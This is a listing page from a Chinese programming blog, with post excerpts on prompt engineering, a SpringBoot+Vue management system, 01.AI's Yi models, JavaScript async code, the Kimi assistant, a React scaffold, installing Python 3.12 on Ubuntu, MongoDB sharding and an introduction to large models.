除了基础知识和技巧外，本书还通过丰富的案例深入探讨了AI在各个领域的应用。从教育领域到市场营销、新媒体运营，再到软件开发和数据分析，您将看到AI如何在实际工作中发挥作用，提高工作效率，解决问题。这些案例不仅让您更直观地理解了AI的应用，还为您提供了实践中的参考和启发。
购买链接：
📚 当当购买链接📚 京东购买链接 总结
这本书是一本通俗易懂、内容实用的指南，无论您是初学者还是已经对AI有一定了解的专业人士，都能够从中获得启发和收获。它不仅提供了基本原理的解读，还结合了丰富的实例，让您更直观地理解和应用提示工程。如果您想要在AI的世界中探索更多可能性，那么这本书绝对是您不可错过的指南！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5bd316eeda4ee34e01481a06a53a6c59/" rel="bookmark">
			废物回收机构|基于SprinBoot&#43;vue的地方废物回收机构管理系统(源码&#43;数据库&#43;文档)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		地方废物回收机构管理系统
目录
基于SprinBoot+vue的地方废物回收机构管理系统
一、前言
二、系统设计
三、系统功能设计 1管理员功能模块
2 员工功能模块
四、数据库设计
五、核心代码 六、论文参考
七、最新计算机毕设选题推荐
八、源码获取：
博主介绍：✌️大厂码农|毕设布道师，阿里云开发社区乘风者计划专家博主，CSDN平台Java领域优质创作者，专注于大学生项目实战开发、讲解和毕业答疑辅导。✌️
主要项目：小程序、SpringBoot、SSM、Vue、Html、Jsp、Nodejs等设计与开发。
🍅文末获取源码联系🍅
基于SprinBoot+vue的地方废物回收机构管理系统 一、前言 地方废物回收机构管理系统能够通过互联网得到广泛的、全面的宣传，让尽可能多的用户了解和熟知地方废物回收机构管理系统的便捷高效，不仅为用户提供了服务，而且也推广了自己，让更多的用户了解自己。对于地方废物回收机构而言，若拥有自己的系统，通过系统得到更好的管理，同时提升了形象。
本系统设计的现状和趋势，从需求、结构、数据库等方面的设计到系统的实现，分别为管理员和员工的实现。论文的内容从系统的设计、描述、实现、分析、测试方面来表明开发的过程。本系统根据现实情况来选择一种可行的开发方案，借助java编程语言和MySQL数据库等实现系统的全部功能，接下来对系统进行测试，测试系统是否有漏洞和测试用户权限来完善系统，最终系统完成达到相关标准。
关键字：地方废物回收机构管理；java；MySQL数据库
二、系统设计 系统功能结构如图
三、系统功能设计 系统登录，管理员和员工登录进入系统前在登录页面根据要求填写用户名和密码，选择角色等信息，点击登录进行系统操作，如图5-1所示。
图5-1系统登录界面图
1管理员功能模块 管理员登录系统后，可以对首页、个人中心、员工管理、员工请假管理、销假申请管理、工作日志管理、员工工资管理、员工任务管理、任务汇报管理、设备信息管理、设备借用管理、设备归还管理、设备报修管理、维修入库管理、员工打卡管理、员工评价管理、回收价格管理、宿舍信息管理、宿舍入住管理、宿舍搬出管理、管理员管理、系统管理等功能进行相应的操作管理，如图5-2所示。
图5-2管理员功能界面图
2 员工功能模块 员工登录进入地方废物回收机构管理系统可以对首页、个人中心、员工请假管理、销假申请管理、工作日志管理、员工工资管理、员工任务管理、任务汇报管理、设备信息管理、设备借用管理、设备归还管理、设备报修管理、维修入库管理、员工打卡管理、员工评价管理、回收价格管理、宿舍入住管理、宿舍搬出管理等功能进行相应操作，如图5-16所示。
图5-16员工功能界面图
个人中心，在个人信息页面可以对员工工号、员工姓名、性别、部门、岗位、入职时间、联系方式、邮箱、身份证、照片等内容进行个人信息修改操作，如图5-17所示。
图5-17个人中心界面图
四、数据库设计 (1)工作日志管理E/R图如下所示：
图4-2工作日志管理E/R图
数据库表的设计，如下表：
表4-1：菜单
字段名称
类型
长度
字段说明
主键
默认值
id
bigint
主键
主键
addtime
timestamp
创建时间
CURRENT_TIMESTAMP
menujson
longtext
4294967295
菜单
五、核心代码 package com.service.impl; import com.utils.StringUtil; import com.service.DictionaryService; import com.utils.ClazzDiff; import org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5bd316eeda4ee34e01481a06a53a6c59/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6633a01e6b0be594e33dcc8d1e333d0f/" rel="bookmark">
			李开复：所有应用都应该 AI-First、大模型要更关注 TC-PMF
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者 | 唐小引
出品丨AI 科技大本营（ID：rgznai100）
时间过得很快，中国大模型之战已经度过了百模大战的阶段，进入了许多人称为「大模型应用落地的元年」。时逢五月，零一万物也迎来了成立一周年。5 月 13 日， 赶在 OpenAI 发布会和 Google I/O 之前，在创新工场、零一万物所在的中关村鼎好大厦，李开复博士久违地露面，带来了零一万物最新的产品矩阵发布，以及他对于模型之战从狂奔进入长跑的思考。
在产品矩阵方面，有四大关键点：
千亿参数的闭源模型 Yi-Large 来了，在斯坦福最新的 AlpacaEval 2.0 达到全球大模型 Win Rate 第一，其 API 开放可用，据李开复从各项指标表示，目前 Yi-Large 在多项指标上已经超过了 GPT-4；
过去一年里，以开源构建生态，零一万物的全球化布局成果很是显著，笔者在常浏览的国外诸多榜单中，经常能看到 Yi 大模型的身影。而今天，李开复现场宣布将 Yi-34B、Yi-9B/6B 中小尺寸开源模型版本升级为 Yi-1.5 系列。其从数据对比来看，Yi-34B 模型已全方面达到了超越 Google 的 Gemma、Mistral 以及 Meta 的 Llama 的表现；
更大的模型 Yi-XLarge 正在训练中，基于 MoE 架构，已经有了初步的训练结果，预计晚些时候会正式发布这一模型；
颇值得关注的是，零一正式宣告投身 AI 应用开发，带来一站式 AI 工作平台“AI-First 版 Office”——万知，已全面接入 Yi-Large 大模型。万知支持小程序和 Web 端，当前用户均可直接免费使用。
为什么会带来模型+应用这样的产品组合？这背后的种种，是李开复带领着零一万物对于模型、应用、商业化的思考，他将其称为开闭源的双轨策略，即用闭源探索商业化做 AI-First，开源构建生态。在发布会现场，「全球化」、「AI-First」是他高频提及的词汇，李开复博士定义了零一万物的四大发展原则 —— 全球化布局、模基共建、模应一体、AI-First。
全球化布局和 AI-First 很好理解，模基共建和模应一体如何理解？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6633a01e6b0be594e33dcc8d1e333d0f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/14edd1e5cba4d3ed3a2e7b1893a092d5/" rel="bookmark">
			JavaScript异步编程模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 核心概念案例展示使用Promise使用async/await扩展案例：根据用户年龄提供优惠使用Promise使用async/await 核心概念 JavaScript的异步编程模型主要基于事件循环（Event Loop）、回调函数（Callback）、Promise对象和async/await语法，这些机制让JavaScript能够非阻塞地处理I/O操作，从而实现高效的并发执行。下面是对这些核心概念的简要说明：
事件循环（Event Loop）:
JavaScript运行在单线程上，但通过事件循环机制实现了异步执行的能力。事件循环不断地检查任务队列（Task Queue），将可执行的任务放入执行栈中执行。这个过程分为两大类队列：宏任务（Macrotask）队列和微任务（Microtask）队列。宏任务包括setTimeout、setInterval、I/O、UI渲染等；微任务主要包括Promise的回调、MutationObserver、process.nextTick（Node.js环境）等。执行栈为空时，会先执行当前微任务队列中的所有任务，然后再检查宏任务队列，如此循环。
回调函数（Callback）:
回调是最原始的异步处理方式。在发起一个异步操作时，传递一个函数作为参数，当异步操作完成时，这个函数（即回调函数）会被调用。这种方式在处理简单异步逻辑时有效，但随着异步调用嵌套增多，容易导致“回调地狱”问题，代码可读性和维护性变差。
Promise对象:
Promise是ES6引入的一种解决异步编程问题的新方法。Promise代表一个异步操作的结果，它可以处于三种状态之一：pending（进行中）、fulfilled（已成功）或rejected（已失败）。Promise提供了.then和.catch方法来处理成功和失败的情况，支持链式调用，有助于避免回调地狱，使异步代码更加清晰。
async/await语法:
async/await是基于Promise的更高级的异步编程语法糖，从ES2017开始被引入。使用async关键字声明一个异步函数，该函数内部可以使用await关键字等待Promise的解析，使得异步代码看起来像同步代码一样直观易读。await只能在async函数内部使用，它会使代码暂停在该行直到Promise解决，然后返回Promise的结果，如果Promise被拒绝，则抛出异常。
JavaScript的异步编程模型通过事件循环机制协调执行环境，结合回调函数、Promise以及async/await等语法，为开发者提供了一套强大且灵活的工具集，以高效地处理异步操作，提升应用性能和用户体验。
案例展示 下面是一个结合了Promise和async/await处理异步操作的实际案例，假设我们要从两个不同的API获取数据，并在两者都成功返回后合并处理这些数据。
使用Promise // 假设这是两个获取用户信息和订单信息的异步API function fetchUserInfo(userId) { return new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { resolve({ id: userId, name: 'Alice', age: 30 }); }, 1000); }); } function fetchOrders(userId) { return new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { resolve([{ orderId: 1, product: 'Book' }, { orderId: 2, product: 'CD' }]); }, 800); }); } // 使用Promise.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/14edd1e5cba4d3ed3a2e7b1893a092d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/798992cf48356d6c1aaa8e9becde67f9/" rel="bookmark">
			一分钟上手AI神器——Kimi (附_ 官方提示词)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🐶 AI读了就是我读了？😄 最近频繁刷到 Kimi 相关的 软文，估计是官方花钱 买量 了，笔者用过一阵子，在某些场景确实好用，也给大伙安利一波，先是关于它的简介：
Kimi 是由北京 **月之暗面 **科技有限公司（Moonshot AI）推出的对话式AI助手产品，2023年10月9日正式宣布推出，并于2023年10月10日开放内测。在 **今年3月18日 **宣布大模型技术新突破，Kimi Chat 支持 200万字无损上下文窗口长度，较之前提升10倍，能够在10分钟内在任何新领域接近初级专家水平与用户互动。Kimi 在 出圈的同时，还掀起了国产AI卷 **上下文长度 **的浪潮 🤷‍♀️~
😁 接着说说它能干嘛，普通 AI Chat有的它都有，得益于支持超长的上下文，它更适合：文档/文章速读。就：
上传文档，Kimi解读后，你可以 对文档相关 的内容进行提问，比如：生成总结概要、完整大纲、或是某个知识点的专项解读，而且还支持 联网搜索 进行扩展学习。
Kimi官网
常规用法 用法巨简单，支持 上传文件 或 直接发网址，操作面板：
文件支持：最多50个，每个100MB，接受 pdf、doc、xlsx、ppt、txt、图片等格式。
😃 建议设置下 常用语，方便快速调用，不用每次都输一大堆提示词，比如：添加一个「总结」的常用语：
设置完，输入「总结」即可快速调用：
随便上传一本PDF电子书看看效果：
试试输出 大纲：
让它展开其中某个点进行解读：
😄 效果还可以，另外，建议安装下它的 浏览器插件：
支持 一键总结网页内容，安装完点下Logo即可触发总结：
滑动到底部，支持切换Kimi进行继续对话：
😆 相比复制粘贴URL，再让Kimi去解读，使用 **插件 **高效多了，特别是某些做了反爬的页面，直接发链接，Kimi不一定能获取到页面内容，比如：需要登录后才能查看的内容。
Kimi+ 然后，侧边栏还有个 Kimi+：
点击后的跳转页：
🤔 感觉就是封装了一些 Agent(智能体)，方便用户使用，使用 **Looooooong Kimi **需要 申请内测：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/798992cf48356d6c1aaa8e9becde67f9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22271d2153e34bb0e8cd9eafa30955df/" rel="bookmark">
			react-starter脚手架搭建过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文献给一些 react 新手，不对，应该说针对想要通过 react 进入前端世界的程序猿们~
背景 公司的项目需要使用 react，两三个月前还是一个基本不怎么懂前端，当时的我除了 jquery 什么都不知道，但是公司要求使用 react 开发新的项目，完全不懂前端的我只能去试着学习使用 react 进行开发，然后什么 nodejs/webpack/es5/es6/babel/jsx 一堆堆全部涌过来，讲真，彻底被前端的复杂世界搞懵逼了，从来没想过前端是这么的复杂。然后匆匆忙忙的开始学习，循环往复十来天。接着公司要求写项目了，我擦，我还什么都没学会，没办法，硬着头皮上，去全球最大同性交友网站（#雾）瞅了瞅，找了个 star 很多的脚手架，开始了开发之旅，其中的痛苦真的是不忍赘述，经常为了目标熬夜赶工，结果还是各种拖拖踏踏，一直没能完成。还好一个月后被叫去做其他项目，不然真的是崩崩崩。接下来的时间开始了真正的探索 react 路途…一两个月的工作之余熬夜苦学之后，尝试了很多不同的脚手架之后，开始有了自己对于开发、编译的需求，处于对于想要将一个技术完全征服的欲望，于是开始准备搭建自己的 react 脚手架
准备工作 知识准备 react 自不必说，首先是去了解nodejs、webpack、babel、es6等等，多学习源生 js，彻底抛弃 jquery 才能真正感受到源生 js 带来的魅力，了解一些 js 规范，比如commonjs之类的。一定要用心去感悟（笑）。
需求准备 对于个人的一路走来的感觉来说，前端开发经验少的人，应该还是先使用别人的脚手架，多读读人家的 readme 的说明，了解了解别人对于本项目的一些规范或者需求，这里推荐一个react starter kit，感觉确实很全面，不过里面没有使用 jsx 语法定义路由，而是使用的webpack 的 api 来实现的按需加载，开始可能会让人有点昏，不过多去了解了解也就没什么障碍，官方也给出了很好的解释。多写写，多动手，就会明白自己的一些需求了。这里列出我自己的一些想要的需求。
开发模式下：
热加载（没它开发会累哭）能与后台交互时的解决跨域问题 生产模式下：
能把 react 模块分开能自动将生成 js 文件绑定到 html 页面压缩 js、css 代码想要使用 ant design 开发，但是 antd 样式文件较大，能够按需加载 通用的：
使用 es6、jsx 语法能生成 map 文件能加载各种文件：json，图片，字体，css，scss，less找路径不要那么麻烦的使用 '…/…/'之类的，能直接从项目跟路径找。命令能够兼容 linux 或者 windows使用 eslint 进行代码检查使用 esformatter 进行代码格式化能自动处理 css 样式兼容性问题 开始搭建 虽然我搭建环境有时候在 linux 有时候在 windows，不过写此文的时候处于 windows 环境下，懒得切系统，所以统一使用 windows 环境，一般来说 linux 没什么不同，想起来有不同的时候我会说。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/22271d2153e34bb0e8cd9eafa30955df/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bea11fa318bbb13ba4c23db9f343eaba/" rel="bookmark">
			ubuntu22.04系统python多版本安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ubuntu22.04系统python多版本安装 1 ubuntu22.04常规方法无法把python升级到最新版本2 APT PPA安装方式可升级python到当前最新的3.123 通过APT PPA方式安装python3.123.1 升级ubuntu环境3.2 安装python3.123.3 设置默认python版本 4 升级pip5 参考文献 1 ubuntu22.04常规方法无法把python升级到最新版本 ubuntu 22.04自带的python版本是3.10.12，python3.11版增加了几个新的特性，包括case语句的支持，当前的最新版本是3.12.3。
用ubuntu的apt update只能升级python到3.11.0，源码安装3.12版时，ssl包要求的openssl版本是1.1.1，低于ubuntu系统自带的3.0.2，编译python3.12.3源码是会出很多lib库缺失错误。
经过百度，找到“APT PPA”方式，可以安装编译好的python多个版本、包括最新版本。
2 APT PPA安装方式可升级python到当前最新的3.12 PPA是"Personal package archives"的首字母缩写，这是由“deadsnakes” team维护的ubuntu系统下的非官方python包，当前提供的python版本从3.8到3.12，可以安装他们维护的最新python版本。其官网地址是：https://launchpad.net/~deadsnakes。
3 通过APT PPA方式安装python3.12 3.1 升级ubuntu环境 升级系统：
sudo apt update 升级陈旧的软件包：
sudo apt upgrade 3.2 安装python3.12 增加PPA repository：
sudo add-apt-repository ppa:deadsnakes/ppa 刷新APT cache然后安装python 3.12
sudo apt update sudo apt install python3.12 到此就完成了python3.12的安装，你可以根据需要有选择的安装其他几个扩展包：
sudo apt install python3.12-{tk,dev,dbg,venv,gdbm,distutils} 如果不需要某个扩展包，比如venv，可以从{}中将venv去除。
这些扩展包在国外，全部下载可能需要几十分钟的时间。
3.3 设置默认python版本 当系统中有多个python版本时，为了使用中不至于混乱，可以将其中一个版本设为系统默认版本，以后根据需要可以更改系统默认版本。
设置系统默认版本使用“updaet-alternatives”命令，步骤包含创建符号链接和设置默认项两步。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bea11fa318bbb13ba4c23db9f343eaba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44b6b7dc87f10bfe10d08906a2935110/" rel="bookmark">
			MongoDB分片：打造高性能大数据与高并发处理的完美解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MongoDB 分片是一种水平扩展数据的方法，用于处理数据量巨大的情况。它通过将数据分布到多个机器上，从而实现了数据的分布式存储和查询。分片集群包含多个分片节点，每个节点存储数据的一部分，通过路由器（mongos）将客户端的查询请求路由到正确的分片上。
基本语法 初始化分片集群 启动配置服务器： mongod --configsvr --replSet configReplSet --dbpath /data/configdb 初始化配置服务器副本集： rs.initiate({_id: "configReplSet", configsvr: true, members: [{_id : 0, host : "config1:27019"}, {_id : 1, host : "config2:27019"}, {_id : 2, host : "config3:27019"}]}) 启动分片服务器： mongod --shardsvr --replSet shardReplSet --dbpath /data/shard1 mongod --shardsvr --replSet shardReplSet --dbpath /data/shard2 初始化分片服务器副本集： rs.initiate({_id: "shardReplSet", members: [{_id : 0, host : "shard1:27018"}, {_id : 1, host : "shard2:27018"}]}) 启动路由器： mongos --configdb configReplSet/config1:27019,config2:27019,config3:27019 将分片添加到集群： sh.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/44b6b7dc87f10bfe10d08906a2935110/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a7f74b66bcb63251afc1be996933067/" rel="bookmark">
			AI大模型：大数据&#43;大算力&#43;强算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：好久不见，甚是想念，我是辣条，我又回来啦，兄弟们，一别两年，还有多少老哥们在呢？
目录
一年半没更文我干啥去了？
AI大模型火了
人工智能
大模型的理解
为什么学习大模型
大模型Function Calling功能增强
大模型接入公司的数据：embeddings&amp;RAG
国产大模型
大模型学习路线
阶段一：AI大模型时代的华丽登场
阶段二：AI大模型API应用开发工程 阶段三：大模型应用架构进阶实践
阶段四：大模型微调与私有化部署 总结：我眼中的IT行业现状与未来趋势
一年半没更文我干啥去了？ 不仅我没更文，好像跟我同一批的很多博主都没有更文了，有点怀念那个时候大家一起从0粉开始输出，大家相互卷，卷内容，卷文字，从普通的几百字文章到几千字的文章，最后动不动就万字长文，甚至恐怖到十万字长文，当时官方也吐槽：我们这些博主怎么动不动搞这种大长文？当时大家的卷还不是为了那份流量，从开始的博文记录自己的技术学习到后面为了用户而出输出，那段时间很快乐，很充实，很安逸。
有人说经常怀念过去的人是现在过的不好，好像说对了，好像有不对，你觉得呢？这一年半我自己也经历了不好，因为图文创作本身是没啥收益的，当时后面去试了短视频创作这块，我们一批很多博主后面都尝试了，最后破圈成功的只有英雄老哥【ID：英雄哪里出来】，他现在某站和某音粉丝量惊人，甚至是我们这个赛道里的头部博主了，以前搞博客赛道的时候就是CSDN的头部，现在也是短视频程序员里的头部，所以成功的人好像做啥都能成功，就像雷军雷总一样，当初写代码那么优秀，后面把小米手机做的这么优秀，现在小米汽车同样做的这么优秀。任何人之间的差距，有外在的更有内在的，人往往被外在迷惑而忽视了内自。
我也经历许多挫折，能怎么办呢，拍拍身上的灰尘，继续向前进，与各位互勉。
AI大模型火了 好像火了，年年都在炒，年年炒的东西都不一样，我不想聊纯技术的东西（其实我不太擅长技术0.0），我就蹭蹭这个热度（我不是纯蹭啊，蹭热度的同时跟大家聊明白）
人工智能 传统AI
传统AI技术在工业控制、智能家居、无人驾驶、自动回复等领域也取得了较好的应用效果，在智能家居领域，传统AI技术能够实现对家居设备的智能控制，提高居住舒适度。比如家里的小度小度，智能语音机顶盒，智能控制的电器，就是最多的应用场景。但是它一般比较难有上下文的语言关联能力，也就是说，它不能够结合之前人类跟它的沟通来回答人类的问题。典型的代表就是智能客服，智能客服经常进入死循环，这就是因为没有结合上下文能力的原因。传统AI技术主要基于规则和知识库进行问题求解。
大模型
大模型在自然语言处理、计算机视觉、语音识别等领域取得了显著的成果。大模型还在金融、医疗、教育等领域取得了较好的应用效果。他最大的特点是，大模型给人的感觉是他能够像人一样“思考”，能够结合上下文的内容进行像人一样的回答，似乎它有记忆力一样。
大模型通常采用深度学习技术，通过大规模 数据集 训练出深度神经网络，从而实现对复杂问题的高效解决。大模型具有较好的泛化能力，能够在大量数据集上获得较好的性能。此外，大模型还具有较好的可扩展性，能够通过增加网络深度和网络宽度来提高性能。在人工智能（AI）领域，语言模型是一种可以预测文本序列的概率的统计模型。
大模型的理解 为什么学习大模型 通俗的理解：大模型是一个训练好的智能集体，它不具备联网的能力，它更像是一个人，但是这个人没有手机和电脑可以联网，因此你对它提问，它都会基于自己的知识理解给你答案，这个答案不一定是正确的。因此，大模型的数据知识库知识库是截至到2021年9月份的，这也就意味着在这个日期之后的知识它是一无所知的，尽管可以通过激发它的涌现能力让它具备一定的推理能力。
需要学习的人群：AI使用者：使用别人开发的AI工具，每个人都是这个角色。AI产品设计者：设计给他人使用的AI工具。AI产品开发者： 编程实现AI工具。AI产品的设计和开发者，是一般人在AI中具有最大的机会的人。
大模型Function Calling功能增强 当大模型不懂某些技能，怎么办？比如，我问：请问明天我需要打伞吗？，这个问题大模型是解决不了的，因为大模型是没有联网的。
大模型会需要查询我所在地址的天气情况，然后基于天气情况才能告诉我我是否需要打伞
于是大模型就会去查询天气，然后综合天气给的结果给我们一个答案
模型的结构
应用如下所示
Function Calling在上图中②所做的事就是，大模型发现自己要回答问题需要知道天气情况才能给出答案，因此，大模型就会去去调用天气的接口函数，查询天气，这个过程就是Function calling Agent
大模型能够充分发挥自身的语义理解能力，解析用户的输入，然后在函数库中自动挑选出最合适函数进行运行，并给出问题的答案，整个过程不需要人工手动干预。这整个过程，好像不需要人处理，大模型自己就像人一样在做整个流程，这个流程的组合体就是一个智能的人一样，称为Agent，智能体。 APIs
我们给大模型提供的接口肯定就不止是一个，可能是很多个，一系列的，那么这一系列的接口，我们称为APIs，函数库 大模型接入公司的数据：embeddings&amp;RAG 当一个公司有一系列的书本资料的时候，遇到了问题需要人去查书，然后再总结，这个过程很慢，那么可以把这个整理为一个向量库的标准数据，然后当用户向大模型提出问题的时候，大模型就会去这个数据库中查找数据，并反馈给用户结果
embeddings
由于大语言模型信息的滞后性以及不包含业务知识的特点，我们经常需要外挂知识库来协助大模型解决一些问题
为了让外挂的知识库更好的被访问，于是需要对数据进行标准的格式输出，我们称之为向量化》embeddings
RAG
相比于仅依赖大型语言模型的生成，RAG技术可以从外部知识库中检索信息，避免了模型的幻觉问题，并提升了对实时性要求较高问题的处理能力。与传统的知识库问答系统相比，RAG技术更加灵活，可以处理非结构化的自然语言文本。
RAG并非旨在取代已有的知识库问答系统，而是作为一种补充，强调实时性和准确性，并且通过结合生成和检索机制来提升自然语言处理任务的效果。
RAG优势
国产大模型 文心一言
智谱清言
星火大模型
通义千问
MOSS
盘古大模型
云雀
混元
商汤 - 商量SenseChat
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a7f74b66bcb63251afc1be996933067/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/349/">«</a>
	<span class="pagination__item pagination__item--current">350/621</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/351/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>